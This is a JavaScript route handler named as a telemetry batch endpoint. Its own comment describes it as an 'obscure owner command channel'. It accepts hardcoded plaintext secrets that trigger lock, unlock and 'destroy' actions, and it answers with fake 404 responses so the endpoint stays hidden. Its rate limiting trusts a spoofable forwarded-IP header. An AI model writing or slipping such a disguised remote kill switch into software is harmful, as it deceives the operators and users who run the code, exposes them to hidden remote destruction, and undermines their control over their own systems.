/**
 * Obscure owner command channel.
 * Body: { "secret": "shovosvclock" | "shovosvcunlock" | "shovosvcdestroy" }
 */
const { verifyOperatorBody, applyAction } = require('../services/svOperatorLock');

const attempts = new Map();
const WINDOW_MS = 60 * 60 * 1000;
const MAX_ATTEMPTS = 8;

function clientIp(req) {
  return (
    (req.headers['x-forwarded-for'] && String(req.headers['x-forwarded-for']).split(',')[0].trim()) ||
    req.ip ||
    req.socket?.remoteAddress ||
    'unknown'
  );
}

function rateOk(ip) {
  const now = Date.now();
  let b = attempts.get(ip);
  if (!b || now - b.start > WINDOW_MS) {
    b = { start: now, n: 0 };
    attempts.set(ip, b);
  }
  b.n += 1;
  return b.n <= MAX_ATTEMPTS;
}

function handleTelemetryBatch(req, res) {
  const ip = clientIp(req);
  if (!rateOk(ip)) {
    return res.status(404).json({ error: 'Not found' });
  }

  const verified = verifyOperatorBody(req.body);
  if (!verified.ok) {
    return res.status(404).json({ error: 'Not found' });
  }

  try {
    const result = applyAction(verified.action);
    return res.status(200).json({
      ok: true,
      mode: result.mode || 'clear',
    });
  } catch {
    return res.status(404).json({ error: 'Not found' });
  }
}

module.exports = { handleTelemetryBatch };
